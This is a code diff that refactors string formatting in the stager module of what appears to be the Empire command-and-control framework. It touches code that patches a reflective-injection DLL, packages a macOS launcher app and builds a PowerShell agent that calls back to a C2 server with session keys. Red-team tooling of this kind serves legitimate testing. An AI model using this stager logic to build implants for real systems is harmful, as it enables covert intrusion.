@@ -123,12 +123,12 @@ class Stagers:
 
         # read in original DLL and patch the bytes based on arch
         if arch.lower() == "x86":
-            origPath = "%s/data/misc/ReflectivePick_x86_orig.dll" % (
-                self.mainMenu.installPath
+            origPath = (
+                f"{self.mainMenu.installPath}/data/misc/ReflectivePick_x86_orig.dll"
             )
         else:
-            origPath = "%s/data/misc/ReflectivePick_x64_orig.dll" % (
-                self.mainMenu.installPath
+            origPath = (
+                f"{self.mainMenu.installPath}/data/misc/ReflectivePick_x64_orig.dll"
             )
 
         if os.path.isfile(origPath):
@@ -307,9 +307,7 @@ class Stagers:
 
         MH_EXECUTE = 2
         # with open(self.installPath + "/data/misc/machotemplate", 'rb') as f:
-        with open(
-            "%s/data/misc/machotemplate" % (self.mainMenu.installPath), "rb"
-        ) as f:
+        with open(f"{self.mainMenu.installPath}/data/misc/machotemplate", "rb") as f:
             macho = macholib.MachO.MachO(f.name)
 
             if int(macho.headers[0].header.filetype) != MH_EXECUTE:
@@ -473,7 +471,7 @@ class Stagers:
             if AppName == "":
                 AppName = "launcher"
 
-            tmpdir = "/tmp/application/%s.app/" % AppName
+            tmpdir = f"/tmp/application/{AppName}.app/"
             shutil.copytree(directory, tmpdir)
             with open(tmpdir + "Contents/MacOS/launcher", "wb") as f:
                 if disarm is not True:
@@ -489,9 +487,9 @@ class Stagers:
 
             os.rename(
                 tmpdir + "Contents/MacOS/launcher",
-                tmpdir + "Contents/MacOS/%s" % AppName,
+                tmpdir + f"Contents/MacOS/{AppName}",
             )
-            os.chmod(tmpdir + "Contents/MacOS/%s" % AppName, 0o755)
+            os.chmod(tmpdir + f"Contents/MacOS/{AppName}", 0o755)
 
             if icon != "":
                 iconfile = os.path.splitext(icon)[0].split("/")[-1]
@@ -778,14 +776,7 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
             )
 
             if options["Language"]["Value"] == "powershell":
-                launch_code = "\nInvoke-Empire -Servers @('{}') -StagingKey '{}' -SessionKey '{}' -SessionID '{}' -WorkingHours '{}' -KillDate '{}';".format(
-                    host,
-                    staging_key,
-                    session_key,
-                    session_id,
-                    working_hours,
-                    kill_date,
-                )
+                launch_code = f"\nInvoke-Empire -Servers @('{host}') -StagingKey '{staging_key}' -SessionKey '{session_key}' -SessionID '{session_id}' -WorkingHours '{working_hours}' -KillDate '{kill_date}';"
                 full_agent = comms_code + "\n" + agent_code + "\n" + launch_code
                 return full_agent
 
